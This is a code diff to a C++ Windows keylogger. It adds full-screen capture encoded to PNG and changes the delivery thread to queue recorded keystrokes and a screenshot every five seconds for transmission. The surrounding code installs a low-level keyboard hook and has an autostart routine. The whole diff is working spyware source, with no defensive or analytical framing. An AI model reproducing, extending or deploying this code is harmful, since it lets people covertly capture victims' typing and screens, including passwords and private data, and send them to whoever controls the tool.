@@ -15,13 +15,52 @@ HHOOK hHook = NULL;
 bool capsLock = false;
 
 std::string recordedKeystrokes = "";
+std::string capturedScreenshot = "";
 
+
+std::mutex capturedScreenshotMutex;
 std::mutex recordedKeystrokesMutex;
 
 
+std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
+{
+    std::string s = "";
+
+    for(auto &uc : vector)
+    {
+        s += (char)uc;
+    }
+    return s;
+}
+
+std::vector<unsigned char> convertStringToUnsignedCharVector(std::string s)
+{
+    std::vector<unsigned char> vector;
+
+    for(auto &c : s)
+    {
+        vector.emplace_back((unsigned char)c);
+    }
+
+    return vector;
+}
 
 
-void addToRecordedKeystrokes(std::string value)
+
+void saveToCapturedScreenshot(std::string screenshot)
+{
+    std::unique_lock<std::mutex> lock(capturedScreenshotMutex);
+    capturedScreenshot = screenshot;
+}
+
+std::string getCapturedScreenshot()
+{
+    std::unique_lock<std::mutex> lock(capturedScreenshotMutex);
+    return capturedScreenshot;
+}
+
+
+void saveToRecordedKeystrokes(std::string value)
 {
     std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
     recordedKeystrokes += value;
@@ -70,46 +109,118 @@ void sendGetRequest(std::string url)
 }
 
 
-void deliveryThread(DataTransmission &dt)
+std::vector<unsigned char> getScreenshot()
 {
+    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    /*std::cout << x << std::endl;
+    std::cout << y << std::endl;
+    std::cout << cx << std::endl;
+    std::cout << cy << std::endl;*/
+
+    std::vector<unsigned char> png;
+
+
+    HDC dcScreen = GetDC(NULL);
+    HDC dcTarget = CreateCompatibleDC(dcScreen);
+
+
+    BITMAPINFO bi{};
+    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bi.bmiHeader.biWidth = cx;
+    bi.bmiHeader.biHeight = -cy;
+    bi.bmiHeader.biPlanes = 1;
+    bi.bmiHeader.biBitCount = 32;
+    bi.bmiHeader.biCompression = BI_RGB;
+
+
+    void* pixels = nullptr;
+
+    HBITMAP bmpTarget = CreateDIBSection(dcScreen, &bi, DIB_RGB_COLORS, &pixels, NULL, 0);
+
+
+    if (!bmpTarget)
+    {
+        DeleteDC(dcTarget);
+        ReleaseDC(NULL, dcScreen);
+        return{};
+    }
+
+
+    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
+
+    BitBlt(dcTarget,0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
+
+
+    //BGRA to RGBA
+    std::vector<unsigned char> rgba(cx * cy * 4);
+
+    unsigned char* src =
+        static_cast<unsigned char*>(pixels);
+
+    for (int i = 0; i < cx * cy; ++i)
+    {
+        rgba[i * 4 + 0] = src[i * 4 + 2]; // R
+        rgba[i * 4 + 1] = src[i * 4 + 1]; // G
+        rgba[i * 4 + 2] = src[i * 4 + 0]; // B
+        rgba[i * 4 + 3] = 255;             // A
+    }
+
+
+    unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);
+
+    SelectObject(dcTarget, oldBmp);
+    DeleteDC(dcTarget);
+    ReleaseDC(NULL,dcScreen);
+    DeleteObject(bmpTarget);
+
+    return png;
+}
+
+
+
+
+void deliveryThread(DataTransmission &dt,int interval_seconds)
+{
+    interval_seconds *= 1000;
     for(;;)
     {
-        Sleep(1000);
+        Sleep(interval_seconds);
+
+
+
+
         const std::string s = getRecordedKeystrokes();
         if(s != "")
         {
-            dt.Enqueue(s);
+            dt.Enqueue(0,s);
             clearRecordedKeystrokes();
         }
 
+        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
+        dt.Enqueue(1,getCapturedScreenshot());
+
 
     }
 
 }
 
-
-std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
+/*void screenCaptureThread(DataTransmission &dt, int interval_seconds)
 {
-    std::string s = "";
-
-    for(auto &uc : vector)
+    interval_seconds *= 1000;
+    for(;;)
     {
-        s += (char)uc;
+        Sleep(interval_seconds);
+        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot());
+
     }
-    return s;
-}
+}*/
 
-std::vector<unsigned char> convertStringToUnsignedCharVector(std::string s)
-{
-    std::vector<unsigned char> vector;
 
-    for(auto &c : s)
-    {
-        vector.emplace_back((unsigned char)c);
-    }
 
-    return vector;
-}
 
 
 LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
@@ -125,13 +236,13 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
         if (wVirtKey == VK_BACK)
         {
-            addToRecordedKeystrokes("[Backspace]");
+            saveToRecordedKeystrokes("[Backspace]");
             //recordedKeystrokes += "[Backspace]";
             return CallNextHookEx(hHook, code, wParam, lParam);
         }
         else if(wVirtKey == VK_RETURN)
         {
-            addToRecordedKeystrokes("[Return]");
+            saveToRecordedKeystrokes("[Return]");
             //recordedKeystrokes += "[Return]";
             return CallNextHookEx(hHook, code, wParam, lParam);
         }
@@ -198,7 +309,7 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
             char buffer[64] = { 0 };
             WideCharToMultiByte(CP_UTF8, 0, wbuffer, result, buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
 
-            addToRecordedKeystrokes(buffer);
+            saveToRecordedKeystrokes(buffer);
             //recordedKeystrokes += buffer;
             //std::cout << recordedKeystrokes << std::endl;
             //sendGetRequest("http://echo.free.beeceptor.com");
@@ -240,76 +351,7 @@ void addToAutostart()
 
 }
 
-std::vector<unsigned char> getScreenshot()
-{
-    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
-    std::cout << x << std::endl;
-    std::cout << y << std::endl;
-    std::cout << cx << std::endl;
-    std::cout << cy << std::endl;
-
-    std::vector<unsigned char> png;
-
-
-    HDC dcScreen = GetDC(NULL);
-    HDC dcTarget = CreateCompatibleDC(dcScreen);
-
-
-    BITMAPINFO bi{};
-    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-    bi.bmiHeader.biWidth = cx;
-    bi.bmiHeader.biHeight = -cy;
-    bi.bmiHeader.biPlanes = 1;
-    bi.bmiHeader.biBitCount = 32;
-    bi.bmiHeader.biCompression = BI_RGB;
-
-
-    void* pixels = nullptr;
-
-    HBITMAP bmpTarget = CreateDIBSection(dcScreen, &bi, DIB_RGB_COLORS, &pixels, NULL, 0);
-
-
-    if (!bmpTarget)
-    {
-        DeleteDC(dcTarget);
-        ReleaseDC(NULL, dcScreen);
-        return{};
-    }
-
-
-     HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
-
-    BitBlt(dcTarget,0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
-
-
-    //BGRA to RGBA
-    std::vector<unsigned char> rgba(cx * cy * 4);
-
-    unsigned char* src =
-        static_cast<unsigned char*>(pixels);
-
-    for (int i = 0; i < cx * cy; ++i)
-    {
-        rgba[i * 4 + 0] = src[i * 4 + 2]; // R
-        rgba[i * 4 + 1] = src[i * 4 + 1]; // G
-        rgba[i * 4 + 2] = src[i * 4 + 0]; // B
-        rgba[i * 4 + 3] = 255;             // A
-    }
-
-
-    unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);
-
-    SelectObject(dcTarget, oldBmp);
-    DeleteDC(dcTarget);
-    ReleaseDC(NULL,dcScreen);
-    DeleteObject(bmpTarget);
-
-    return png;
-}
 
 
 
@@ -335,9 +377,9 @@ int main()
 
     DataTransmission dt = DataTransmission();
 
-
-    std::thread b(deliveryThread,std::ref(dt));
+    std::thread delivery(deliveryThread,std::ref(dt),5);
     while (GetMessage(NULL, NULL, 0, 0));
+
 
 
     return 0;
